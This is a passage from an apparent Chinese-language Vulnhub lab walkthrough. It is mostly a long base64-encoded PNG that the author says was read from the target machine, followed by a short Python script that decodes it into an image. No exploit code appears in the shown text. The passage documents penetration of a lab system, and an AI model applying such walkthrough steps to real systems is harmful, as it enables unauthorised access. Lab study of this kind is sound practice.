class="line">kR2WmxLxkdl1k73Xugpk3bA6sVfBTGiHhpyv1JcAXR0VJ+iDv8FsCEC3FhxyDTuaOALFUOSzOIqS</span><br><span class="line">XQTjfeLZcHgvEmUrZrjvPaYaQrJ6WOuGZbNxsJZP9qHKjeIQ/arTuM+IVFIHgkZNVUVRLCy7SNin</span><br><span class="line">WsBjKTH6HsRg0A/lplBMR5ZfbBBa8lyzITs0W0VRUmPI6LseVeONosQTjK9wkw3KTaHkcEWkB4L3</span><br><span class="line">tanmShykpWZ1iX8qr1HlRlFyhyEjGSQChWp7VRQDu7xW9sTcFButD2J+iFQqXRdjkjDVl7dBxCa6</span><br><span class="line">NCpK7jBsmLjRBuyKEk9QTCMx+afvmBX8fDmQDElj6QIYgTYYyppUMjdR5UZRcofjMDs+oVSVG0Wx</span><br><span class="line">KTICirOkQrHZNdOu3u4xf4Na0fwGXOsykWWocqMouUN3fDLIFDh+KUoaFBi51j42qjQpgpAYXH08</span><br><span class="line">kDRIxZ0p4JCyyAaznaIoKXNY/hKW+ERFUSzM9r1Z0lPWbMcdkb7CvhCbQpoNarlRlByjCSolJWQo</span><br><span class="line">n2twKUra9EON+ICGskP1L4h3S0Wyw540BSjwWwBFUdKkA8LQD91+S6IoWUUfzIRB+dPutzxAAGqM</span><br><span class="line">8n39MKBnEi/IhoArRVEURXGCAFTDSDaVcjlTwoCsSqctarzxAlVuFEVRFMU1glALURiQnABFURRF</span><br><span class="line">URRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRFURRF</span><br><span class="line">URRFURRFURRFURRFURRFURRFUaYmnZ2dsYQsWrTIbxkVRVEURUlC0G8BFEVRFEVRnESVG0VRFEVR</span><br><span class="line">8opCvwVQspclS5Z84hOfWLJkycjIyD333LNlyxa/JZokF1100aWXXlpTU5PhdYaGhh577LGHH344</span><br><span class="line">6SdPO+20a665Zs6cOT09Pffcc8+rr76a7r0WLFjw8Y9//JRTTiksLPzxj3/84osvTkrkbCdv5liG</span><br><span class="line">uDEOOraeYb+tpaWlGV4qGAz+9Kc/3bRpkyOCKQpozE08d91116iv/9vf/tZvodJm2bJlra2tiR9r</span><br><span class="line">ugwODl5wwQUJbnr33XeP+pV///d/T0vs2267bdQV/vKXv2Q2EtlIfsyxzHFjHHRsPWPs25o527dv</span><br><span class="line">9/trKXmEKjc2P/jBD8YdgWeeecZv0dJg0aJFji86NhPpN7/61a/G/fwjjzySoti33377uFd47bXX</span><br><span class="line">nBsb/8mPOZY5boyDjq1nTPS2Zk57e7vfX07JF1S5sVi3bl2CQbj22mv9FjBV3nrrLUdXmzgGBwfH</span><br><span class="line">3nH9+vUJfuXSSy9NKvOqVasSXOErX/mKC+PkA3kzxzLEjXHQsfWMxG9r5jzwwAN+f0UlL1DlxuKR</span><br><span class="line">Rx5JMAhHjx71W8CU2LBhg6PrzDhs3Lhx1E2feuqpBJ9PxfTyhz/8IcEVrpDImQAAIABJREFUent7</span><br><span class="line">3Rktr8mPOZY5boyDjq1nJH5bHaGystLvb6nkPqrcWDQ1NSUeh3nz5vktY3JuvPFG51aY8Rl7rhoc</span><br><span class="line">HEz8K0njDffs2ZP4CqeeeqprY+Yd+THHMseNcdCx9Yykb2vmbNiwwe9vmatoKvj/JWk2zezZs72R</span><br><span class="line">xF+Srn0LFy70RpJMaG5udvsWfX19o/5PUt0l8w+UlZUlFSz7yY85ljlJx2HsHMv8mlNkbD2gtrY2</span><br><span class="line">D26Rr6hy839Yv3590s+cffbZHkjiL6kcFHJiHHbv3u32LTRdc3LkzRzLkKTjsG3btnSVGx1bz1iz</span><br><span class="line">Zo0HPqMPfOADbt9CyXNeeumlpBbCzs5Ov8V0ne3bt+fNODzxxBNOGIbHZ8+ePWPvmPS3kloHDx06</span><br><span class="line">lPgKq1atcme0vCOf5lgmJB2HxBUHJnfNKTK2HpA4wM5B1I2oTJ5bb701xXn2+9//3m9hXST1tMZc</span><br><span class="line">GQfHi9zYzJgxY+ztkv6WKjf5N8cmR9Jx+O53v+v4NafI2HrATTfdlOJQZ86hQ4f8/rpKDhIMBseW</span><br><span class="line">XEvM1q1b6+rq/BbcYcrLyx988MG8HIfEySOT4KWXXiouLh73Xkl/dyorN3k8x9Ii6TiEQqFPfepT</span><br><span class="line">zl5zioytBwSDwXvvvTetoc6cpqam1atX+/3Vc4yA3wL4w8aNG9evX79o0aKLLrpo7E/b2tqefPLJ</span><br><span class="line">Z599dvny5e95z3vGzU/ZvHnz/v3733jjjccee8yD8A43WLBgwYYNG9auXZv34zBnzpzzzjuvuLj4</span><br><span class="line">8ssvv/jiiydxhaeffvqhhx7q6+vbvHnzwYMHJ/pYLBZLfJ3p06d3dXUl+MChQ4cSJ+WdffbZO3bs</span><br><span class="line">SHyX7GHqzLHEpD4O9fX1KcZy6dh6xowZMzZs2HDBBRdMNNR9fX1//OMfn3/++aGhoQzvNWvWrEsu</span><br><span class="line">uWTdunVjf7R3794dO3Y0Nzf/7ne/y9d+LMrk2bhxY2Id+c477xz1K1dffXXiX3nwwQd9+S6ZcOed</span><br><span class="line">d07NcVi2bNnx48cTfxGTUCi0cuXKFC+e9GpTynIzZefYKCYxDm5cMy/H1gOSBi3cfffdjt80cTnQ</span><br><span class="line">WCz20ksvOX5TJYf59Kc/nXjG3HbbbeP+4sUXX5z4F5977jmPv0smJPXE5f04pB6Lk9Zlk15t6ig3</span><br><span class="line">OscsJj0Oblwzz8bWA5IqkXfddZdLt66rq0t8a+3PoPwfVq5cmXiuJNaFH3jggcS/ftNNN3n2XTIh</span><br><span class="line">cXX2KTIOZ555ZuJvYZFuukrSC04R5UbnmEWG4+DGNfNmbD0g6VCPmzLpINdee21iAbQZqgLwpz/9</span><br><span class="line">KfFEueSSSxL8etIujLmSYJk0QVrHwWISSQqJLxibMsqNzjGLDMfBjWvmzdh6QNJchFS6xWVI0qLn</span><br><span class="line">miiu0Nvbm3iWJK0FmdSXsXTpUm++SyboOFj86Ec/SvwtJhGCkPiCsSmj3Ogcs8h8HNy4Zn6MrQcc</span><br><span class="line">PXo08UClHo03aZJW0/FAwcpRplCF4qTVJJMWA036gWnTpqUnkx/oOFgcPnw48QcmUflesUiaM9LQ</span><br><span class="line">0JD4A/kxxzJ/19y4Zn6MrQckVRM9qEBTX1+f+ANTpOPhJJhCyo2iKN7w/PPPT/qnipINnHfeeYk/</span><br><span class="line">sGvXLg/OP48++mjiDySVc8qiyo2iKA7zjW98I8FPb731Vs8kUZTJ8a1vfSvxByaR5jYJHnvsscSV</span><br><span class="line">sS699FI13oyLKjeKojjMjh07JtJvvvOd72zevNljeRQlLW6++eZzzz03wQd++tOf/vGPf/RGmPPP</span><br><span class="line">Pz/xB5599llvJMktVLlRFMV5vvrVr1511VXhcNj8n9ddd90tt9zil0iKkgp333134uo1t9xyyzXX</span><br><span class="line">XOOZPLt27Vq8ePGuXbsm+kBdXV1TU9PatWs9EyknKPRbAEVJRHFx8ZVXXrl+/fpt27Y9/PDDjY2N</span><br><span class="line">fkuUM1RVVV155ZXr1q3btm3bL3/5y46Ojklc5GMf+9gFF1zw4osvPvnkk0eOHEnrd++///7777//</span><br><span class="line">kksuqa2ttWrGT0KAzLHGYe3atW1tbRle6o033pjEOChZjj1DSktLN27cOPYDDQ0Njz766ObNm0dG</span><br><span class="line">Rh599NFoNOqxhPX19Wecccbq1avPOuusNWvWLFmyZMOGDeYH5s2b9/LLL+/YsWP79u3btm177bXX</span><br><span class="line">tmzZ4rGQim8kTqiLTZk03Rwah7EVpSfRKnkibr755sTf4ic/+Um618yesb3ttttG/eLtt9+e1ne5</span><br><span class="line">4oorMh+QSePeOGRO6uOQ9FJJ54Mb18yPdcwpks6Qq6++2m8Zx2HJkiXHjh1LILb2Z5hC6KJgkSvj</span><br><span class="line">MNGi41QHnDxWbu66665xfzf1JjgTlUb9y1/+kuIVMsTVccicFMch6XVUufGXpDPkyiuv9FvGRCQu</span><br><span class="line">8dfb2+u3gIon6KJgkRPjsGrVqgTXd6RuVb4qN2vWrEnw66k0lEhcxPbaa69NY0Qmi9vjkDmpjEPS</span><br><span class="line">i6hy4yNJZ8jOnTv9ljEJGzZsSPwV/vSnP/kto29oQLGSjSTOJXavWV0e8PWvfz3BT7/zne8kvULi</span><br><span class="line">JtXf/OY305bJDxKPQ+bkyjgoE5F0hvzrv/6rN5JMmieffDJxJNlFF100ZetNq3KjZCNnnnlmgp8u</span><br><span class="line">Xbp01qxZngmTWyQu6rVmzZrCwiRpBCtWrEjw01mzZuXEcul2cbNcGQdlIpLOkG3btnkjSSbs2LEj</span><br><span class="line">8QembJU/VW7SIGlLOe055xRJC58vXLjQG0lyjqTl+ZN+IGn1/Zwozz8qC90NcmIclIlI+iI0Nzc7</span><br><span class="line">da/PfOYze/bsicVinZ2djzzyyIwZM5y6clIhk37NfEWVmzTYu3dvgp82Nzcn7QOipMK6deuSfmbZ</span><br><span class="line">smUeSKLkLtrkQckSXnvttR/84AennnoqUFNTc+mll7a3t09Zg4pnqHKTBl/60pcS/PSf//mfvRIk</span><br><span class="line">z7njjjuSfubb3/62B5IouYvbMTeKkgovvPDCuM3Dn3vuOXVruooqN2lQX19/3XXXjfujTZs23Xff</span><br><span class="line">fR7Lk5dcf/3169evT/qxRYsWpZ7YrExBXnnllVSipxXFPS655JIEbRx+85vfeCnMVEOVm/S47777</span><br><span class="line">LrvsslHu/Hvuuee9732vXyLlE7fffnvqKsv111//4IMPBoM6h5XxueWWW7Tbg+IjH/vYxxL8dPXq</span><br><span class="line">1UmDC5VJo+0X0uahhx566KGHPvCBD1RWVpaWlj766KMtLS1+C5XDXHHFFZWVlatXr7788svHjX17</span><br><span class="line">+OGH9+/fP2/evI0bN476wOWXX3755ZdbHzhw4MDDDz/c09PjleBKDvCd73zn+9///uWXX758+fKR</span><br><span class="line">kZHEH66trR07xxRl0iTt17148eKGhgZPZJlyqHIzSfxqlJNPXH311T/72c8SfOChhx76yEc+Yndy</span><br><span class="line">+cQnPvHNb37zn/7pn0Z9zG4H87Of/exb3/pW4tAoZaoxMjJy//33p/jhieaYokyCxYsXJ/7AnDlz</span><br><span class="line">vJFkCqImfcUfvvKVryTWbH74wx9edtllo3rUffnLX54o7MnitttuU0+2kglJ55iipMLatWuTVotO</span><br><span class="line">7LdSMkGVG8UH1q5dm7iP4969ez/72c+O+6P77rvvz3/+c4Lf/fCHP3zFFVdkJJ8ytUk6xxQlKb/4</span><br><span class="line">xS+Sfubiiy9es2aN+7JMRVS5UXwgqdn/85//fIKf3nrrrYl/XRPFlQxJOscUJQFPPPGEVdgmKVu3</span><br><span class="line">bk3xk0paqHKj+EDSAlZ79uxJ8NNdu3Z1dXUl+EBtbW3SUD5FSUDSOaYoYykvL/+Hf/iHpqamDRs2</span><br><span class="line">pP5be/bs+d73vqeFSZ1FlRvFB5K6opPuK4cOHXJOHEUZB1VulBS58sort27d2tnZ2d/f//jjj8+b</span><br><span class="line">N2/UBx5++OF3vOMd1dXVJ5544nXXXTe2N8iNN964b9++WCx29OjRBx54oLy83CvZ8xZVbpScJHGn</span><br><span class="line">i7a2Nm2FoSiKB2zduvWBBx5Ys2bNRGe2888//0Mf+tCWLVt6enqOHDly3333FRUV7dq1a9wP19bW</span><br><span class="line">Xnnllf39/Qmq/ympoMqNkpMkzve+6667PJNEUZQpy0svvZQ4Ivi9733vuG3OzjjjjMQ9L1944QWN</span><br><span class="line">xckEVW6UnGTv3r1f/OIXx/3R5s2bte6+oihuc9FFFyXu8vvYY49t2rRpop++733vS3z9Bx98cJKS</span><br><span class="line">KarcKLnLv/zLv9xwww2j/udDDz10zjnn+CKPoihTiptuuinxB37+858n+OmWLVsSG29WrVqlxptJ</span><br><span class="line">o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW</span><br><span class="line">ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum</span><br><span class="line">kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct</span><br><span class="line">5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH</span><br><span class="line">br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30</span><br><span class="line">UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY</span><br><span class="line">NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10</span><br><span class="line">V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh</span><br><span class="line">hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6</span><br><span class="line">fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn</span><br><span class="line">nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m</span><br><span class="line">zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e</span><br><span class="line">/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5</span><br><span class="line">1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS</span><br><span class="line">tl5OsYkkXCnFxcXiGjIzM8U1HDhwQFzD6tWrh9YuRmGux1ID3b59e9asWYJ7vFar9dixYxs2bJAZ</span><br><span class="line">FWB4mZmZZWVlMTExzgqUlJSMGzfu559/9lwMkZGRf/75p+C2WUtLy7Bhwzx3+3bmzJluqUexH+tH</span><br><span class="line">QtsC+jJ7ctNr1apV5eXlggI5OTnJycnS4gGMbeTIkXl5eYIC3d3djz76qKfDUFyTefz48R4NYPv2</span><br><span class="line">7W6sTbEf6yWnbQF9kdz8S3Ec8c6dO+VEAhjejh07xAVeeeUVT8ewbds2Pz/RoMMtW7a0tLR4Ooyq</span><br><span class="line">qio31qbmfQgJbQvojuTmX4WFheICqampzB4LuIXiAOozZ854OgbF0QyHDx/2dAwWiyU+Pr61tTUj</span><br><span class="line">I8MttSn2YxYpbQvojuTmrsbGRnGBhx9+WE4kgLFFRkaKC9TV1Xk6BsXJoJubmz0dQy+r1do7HLi6</span><br><span class="line">uvrkyZMuvsHQ3d0tLuBwOFypH/AJJDd3KT6ujoqKkhMJYGDx8fHi50FNTU0Sngd5oZiYmIyMjGPH</span><br><span class="line">jl2/fl1bDYpta6EfgzmQ3Ny1ZcsWcYF169bJiQQwsBdffFFcQHFEjuFFRUXZ7XYNX1RsWwv9GMyB</span><br><span class="line">5OaukpKSTz75RFDAZrO98MIL0uIBjMdmsy1fvlxQoLKy8q233pIWj9cKCQnZvHnzkL6i2LZ9xejH</span><br><span class="line">YHgkN/+xdOnS999/X1Bg165d/N8DaJOZmVlcXCwoUFRUNGHCBGnxeLmsrCz1hRXb9l70YzA80y2/</span><br><span class="line">oGjFihW7d+/OysoKDg6OjIwcOMXk22+/vWzZstzc3MbGxhs3bnz//fe6xAlfV1NTU11dHRIS4q4J</span><br><span class="line">f71TQkJCREREUFDQ6tWrbTbbwAK97fDXX3/t3btXzcs+5hEYGBgeHi540UFl2w56jtGPAaY2ZsyY</span><br><span class="line">M2fOCCa3bmhomD17tt5hDoF4ru4ell/4f55bfqGiouLeOSEVz7F7+dDyC0lJSRUVFerbQbLW1lbx</span><br><span class="line">biq+0qVI8VgocjY6eKhta7x+zHWKjc/yCz6Nx1IK6uvrH3vsMcEMfuHh4QUFBdnZ2TKjgu/qffJy</span><br><span class="line">7z/KiueYL1qwYMGVK1cEaycNbAf0U1RUNOh73Rraln4MZkNyo8qaNWsuXbokKLBx48bU1FRp8cBH</span><br><span class="line">dXR0OFtOSPEc8yHh4eFHjhwRFBC0A/oMOt2wK21LPwbzILlRS3H83bvvvisnEviuNWvWCD41zBjP</span><br><span class="line">Xbt2iQuI2wEWi2XZsmWD3tZysW3px2ASJDdqlZSUdHR0CAokJiaGh4dLiwe+qKSkRPyp+BzzFWlp</span><br><span class="line">aeIC4nYwufLy8smTJ3/wwQeDfupi29KPwSRIboZAcdbUUaNGyYkEPkrxFDLGzLyKKxsYYzfdqKio</span><br><span class="line">aN68eY888shDDz00adIkwcMj19uWfgxmwKvgAKCnp5566rPPPtM7CsBQSG4AQDdPPvnk0aNH9Y4C</span><br><span class="line">MBoeSwGAPgoLC8lsAE8guQEAfWzatEnvEABjMuljqbCwsIiICLvdXl9fr3csAEyqsrJS7xAAYzLd</span><br><span class="line">nZu4uLjS0tJff/31woULN2/eLC0tTUpK0jsoAGbkcDj0DgHa2e12cYGQkBBxgdDQUBdrUCxgWuZK</span><br><span class="line">bmbMmHHt2rWUlJS+v6SkpFy5cmXOnDk6RgUA8DmnT58WF5g/f77g08jIyJiYGHENir9NGRkZ4gKm</span><br><span class="line">ZaLkZuTIkc7Oxfz8fNcXyQMAmMdrr70mLrBy5crAwEBnn+7YsUNxEwsWLBAkQDk5OYo1mJaJkps9</span><br><span class="line">e/YIPtWwBDQAwMwmT54sLuBsadjVq1crrvjdy9mMjvPnz9+wYYOaGszJRMmNzWYTfDpjxgxpkQAA</span><br><span class="line">DODSpUtjx469ePGiswJxcXF2u33KlCl9fwkODj506JCa2za9rFZrT0/P7Nmz+/4yfPjw7du3Hzt2</span><br><span class="line">THPYZmCit6XEA6/8/PysVmtbW5u0eADoKCAgQFyA0b5Qo76+furUqWFhYbGxsUFBQVlZWf0GyoSE</span><br><span class="line">hFy4cKGpqamqqspqtU6cOFHDVgoKCjo6OsrLywMCAu4dNgpnTJTcAECv8PBwcXLT0dHR1NQkLR74</span><br><span class="line">ulu3bt26dctisRw/fjw1NfXcuXP9CoSEhLj4ZlNgYKD4+QPuZaLHUgDQa8WKFeICH374oZxIYDzn</span><br><span class="line">z58fO3as3lGYHckNAHMZM2ZMdna2oMAff/yxZs0aafHAeOrr69evX693FKZGcgPARBITE2/evCko</span><br><span class="line">UFtb++CDD0qLB0b1zjvv6B2CqZHcADC4oKCghISEuXPn5ufnV1RUDCzgcDgqKyuPHz8+b9686Oho</span><br><span class="line">+RHCeLq7u69evap3FObFgGIAhhUWFvb555+npaU5K9DW1rZo0aLCwkKZUcEk6urq4uPj9Y3BtOPi</span><br><span class="line">SW4AGFNKSkppaamgQE1NTWxsrLR4YDZff/217mv7nDp1St8A9MJjKQAGFBgYKM5sLBYLmQ08aufO</span><br><span class="line">nfrOlrR3717TTt5GcgPAgHJzc8UFeJkFEkybNk2vTV+6dGnVqlV6bV13JDcADCg9PV1c4KuvvpIT</span><br><span class="line">CcysvLw8Ojr6/Pnzkre7adMmxXWvjI0xNwAMSHE2WNMOtEQvh8MhnqVacYEOlWpra6dNmxYVFTV+</span><br><span class="line">/Hh31SnQ1tbGAHkLyQ0AwISqq6sTExMFBWJjY92YAdfW1tbW1rqrNijisRQAwHT2798vLrBy5Uo5</span><br><span class="line">kcATSG4AAKazdetW8a2UJUuWaFvBG96A5AYAYEbR0dG//PKLoEBZWVlycrK0eOBGJDcAAJMaN27c</span><br><span class="line">okWLioqKampquru7Bxa4fPnyl19+OXv27KioqP/9j19Mn8GhAgCY1xdffDFz5szY2Nhhw4Y9/vjj</span><br><span class="line">LS0t/QrMnTu3oKDg+vXrf//995kzZ8aMGaNLnBgSkhsAACwWi+XEiROjRo2qrKx0VmD69Ok3b960</span><br><span class="line">2Wwyo4IGJDcAANw1YcIE8aoFxcXFkZGRssKBFiQ3AAD8x7PPPisu8NFHH8mIA1qR3AAA8B8nTpwQ</span><br><span class="line">F5g+fbqfH7Pgei8TJTeDjoS/l+KZqlhAcRPegHYwNgnH13Xe8KvgDTFowPUrh8PhUJyemCdT3sxE</span><br><span class="line">yU1NTY24QGxsrOBTPz+/8PBwcQ3V1dVDDks62sHYJBxf14ljkMMbYtCA61eaixcviguEhobKiQQa</span><br><span class="line">mCi5OXTokLjAM888I/h0wYIF4q+fOnXK4XAMOSzpaAdj8/TxdQtxDHJ4QwwacP1K8/zzz4sLzJkz</span><br><span class="line">R04kgILffvutR0hwm1H8xZ6eHqvVKnFXXKJ7O3hDY7700kviGN57772h1un6ftXV1YlrUDMfvEeP</span><br><span class="line">r5oY1FTi6Vv6PhGDtvNc9+vXPLKyssTNpXeAcMpEd24sFsvo0aPFj1Hr6uoG9gv+/v6///67uObo</span><br><span class="line">6Gjxq4NehXYwNs8dXzcaNAbJvCEGDbh+pdm7d+/rr78uKPDTTz+NGDFCWjyAyNq1a8vKypqbm50l</span><br><span class="line">47m5uVOmTBkxYkRCQkJ2drazYp2dnVVVVZs3b9Z7hzTSsR3E/wz1cOfGOfUr+bnr+GqIQX1VfTEE</span><br><span class="line">KVG5174Vgyvnuff0Y8OHD9f8XZ+QlpZ2+vRpu93urA1fffXV9PT04OBgxVPIdXo3BnyBv7//kiVL</span><br><span class="line">urq6FPugfl5++eXg4GC9w3cb+e2gWDPJjTMalinWfHw1x+CuDd2rq6srPz9f/fnmEzG45TzXsR/b</span><br><span class="line">t29fe3t7T09PZ2fngQMHDL/0kr+///z581tbW7WcPe5z8uTJpKQkvRsDvkCQkg9kpLSmH2ntoFg5</span><br><span class="line">yY0zGpKbPkM6vq7E4JatOKNy5nufiMG957nMfsxqtQ5abUhIiLt2x5tVVFSob2oPWblypd7N4NUM</span><br><span class="line">nmirFBoaqnJqh7Fjx96+fdvT8eiFdjA29cfXmxUXF8fExBDDQDKv3+bm5kH/brfbfXQCoSGZMGHC</span><br><span class="line">wPU1JcvNzU1PT9c3Bm9GcvMvxcm2LRbLp59+Wl9f7/lY9EQ7GJua4+v9Dhw4oHcIXhHDQHKu323b</span><br><span class="line">tgkymH379rlSua9YunSp3iFYDh48qHcI8HoBAQGKtwHNsBKsnHZQ3ASPpZxx5bGURd3xVaTvY6le</span><br><span class="line">I0eONEAMbj/P5Vy/DQ0Ngvo7Ozvdsi/ez43j2DSbMWOG3s3gpbhz8y+Hw6H4DmRDQ4OcYHTkcDgU</span><br><span class="line">b7fW1dW5uBXFm+cSnp54IgbX6/R0y6g5vq6TcPgUJ4f1iRjcHqSc61c8sCYgICAwMNDFTfiEGzdu</span><br><span class="line">6B2CwrEwM5Ib9KeYwzU2Nrq4CXENHR0dHR0dLm7CxRgsKiZfH0jc2anZL8XGd/2XSUKO7voZokjC</span><br><span class="line">WerpGDx0npvk+vUG3vDvroTz3EeR3KC/jz/+WPDp8ePHXd/E4cOHNX/qLopbKSwsHGqd4kfgavZr</span><br><span class="line">9+7dgk9PnTrl+s+G+Pi6haeP4Hfffad4n9X7Y/BQhCa5fr2B+GqVoLGxsaSkRN8Y4AMUZy/wxclM</span><br><span class="line">tRG8U+quG86902MMyi31q7F8+XJnMeTk5GirUzA1vsoarl275qwGdw3RcPGdcDXjfgTH13Uql/b0</span><br><span class="line">8hjUfF0bk1y/3kBwtUqQlpamdwPAF5Dc3GvQH+moqCh31R8QEDCwf+zq6pK8tM3GjRsH7uaePXtc</span><br><span class="line">qXPgT8tQ9+v69esebXyLivWJBNQkN4MeX7dISUlRuY9eG4OE89wk1683GPRqlcBHV36FDkhu+nnj</span><br><span class="line">jTeqqqq6uroaGhree+89T0w/unnz5rq6ut5NbNu2ze31qzFx4sQjR440Nze3t7efPHkyNTXV9Trf</span><br><span class="line">fPNNF/dr3bp1FRUVnZ2ddrvdQ+/W9h3fofaq6t/Y6ju+Wjvwu+x2+8GDBzXM9O9VMcg8z01y/XqD</span><br><span class="line">vqvV9XNMUXNzc0FBgXv/1YHBkdzAnIKDgwVP6AZy8XV0AIA8JDcwOfH8JSQ3AHwFb0sB+FdERIQB</span><br><span class="line">1mcAAJIbAHctXrxY7xAAwFUkNwDuOnr0qN4hAICrjL98q5dISEiw2Wze8J5kd3f3jz/+eOLECb0D</span><br><span class="line">gZe6ceMGw8vgIfSEgGxlZWXicZSaa/7222/VvogiS11dXUJCghtbD4bh6cU7YVr0hIAO1q5dK7gG</span><br><span class="line">8vLytFUr7SrVYPr06e5tQxgAyQ08QUqXphE9IQzO7dOWl5aWyrxENXB7G8LXkdzA7egJIRkDiv8j</span><br><span class="line">NDT09u3bA/8eHR2tYcHC1NRU9dO062Xt2rV6hwDAyOgJIR/JTX+jR4/eunVrU1OTxWLp6Og4fPjw</span><br><span class="line">fffdV1tbq6Eqn5ghOyMjQ+8QABgZPSHkI7kZxPr160NDQ++///4HHnhg8eLF//zzj7Z6/P393RsY</span><br><span class="line">oF5GRsa5c+daW1urq6s3bNigdzgwL3pCyEdy49SdO3dcrOHq1atuicSjzp49q3cIcL+8vLzeRUCt</span><br><span class="line">VmtMTExOTk5rayu/MdAFPSFgNJcvX9Z7nJwCPz/mOjKa4uLiQY91V1eXmq8zoBhuR08Iybhz41lT</span><br><span class="line">p07VOwSRWbNmsZaQwTz33HM2m23Qj/z8/Pbs2SM5HsBCTwgYj7+/v+L0gPK1t7enpaXp3TZwv6qq</span><br><span class="line">KvFxV6yBOzfwBHpCyMSNOI+7c+fOpEmT0tPTlyxZ4nA49A7H4nA4fvjhh/379+sdCDwiPj5e8Glg</span><br><span class="line">YKDVam1ra5MWD9CLnhAAoJHiv6qKy/pw5waAr2PMDQAAMBSSGwAAYCgkNwAAwFBIbgAAgKGQ3AAA</span><br><span class="line">AEMhuQEAAIZCcgMAAAyF5AYAABgKyQ0AADAUkhsAAGAoJDeAoTQdSUSlAAABo0lEQVQ2NooLRERE</span><br><span class="line">iAuEh4eLCzQ0NAwtJgCQi+QGMJTCwkJxgSeeeELwqc1m8/MTradbUlLS0tKiJTIAAAAN/Pz8FNfO</span><br><span class="line">DAgIcPZ1Vs0EAABeJzExUZygOHuulJ+fL/7i008/LXlfAAAALBaLJSgo6PTp04I0paura/bs2X3l</span><br><span class="line">U1JSqqurBeWLi4sTEhJ03CMAAADL8OHD4+Li0tPT8/LynKU4VVVVra2tg36al5e3cOHC5OTkESNG</span><br><span class="line">6L0rAAAA/xUTEyN+5NTP3Llz9Q4ZAABAKDg4WGVmk5GRoXewAAAAKmRnZytmNt98843eYQIAAKgT</span><br><span class="line">EhKimNxkZmbqHSYAAIBq7e3t4uQmJiZG7xgBAABUq6ioECc34hmKAcD7sfwCYC7iITVnz57t7u6W</span><br><span class="line">FgwAAIAbCG7bxMfH6x0dAADAEMXFxQ2a2SxcuFDv0AAAADQJCgoqLi7uS2tKS0uTkpL0DgoAAMA1</span><br><span class="line">QUFBycnJYWFhegcCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=</span><br></pre></td></tr></table></figure>

<p>成功读取该文件，将内容复制后，尝试base64解密，，发现是png的文件头如下图：</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub47.jpg"></p>
<p>使用python脚本将该base64字符串转换为png图片，脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os,base64 </span><br><span class="line">strs=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg</span></span><br><span class="line"><span class="string">AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC</span></span><br><span class="line"><span class="string">Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3</span></span><br><span class="line"><span class="string">n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span></span><br><span class="line"><span class="string">oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span></span><br><span class="line"><span class="string">oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3</span></span><br><span class="line"><span class="string">SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA</span></span><br><span class="line"><span class="string">yX3C4pMCIhDQOHVFURTFT1S5UTLGUm4K5J8FiT6rKIqiKG6jyo2SMSEjlDgGQbXcKIqiKH6iMTdK</span></span><br><span class="line"><span class="string">xtiuqCAUQolOK0VRFMVP1HKjOEEYCiFqZE4piqIoik+ocqM4QRSKxD+FTitFUZQpSTVUwwC0+SyI</span></span><br><span class="line"><span class="string">7kKKE1jKjZ0BHpCCN4qiKMoU4V1QI6XOmmG7n7JocITiBCPSgSEgmVPqmXKPAqjyWwZFURSTpTAT</span></span><br><span class="line"><span class="string">QjAMEZgJ50OJb+Ko5UZxgigUymyyyhOrcuMSy+BtEIIheA66/ZZHURQFKIQwEF+w/nx4HZp8EEct</span></span><br><span class="line"><span 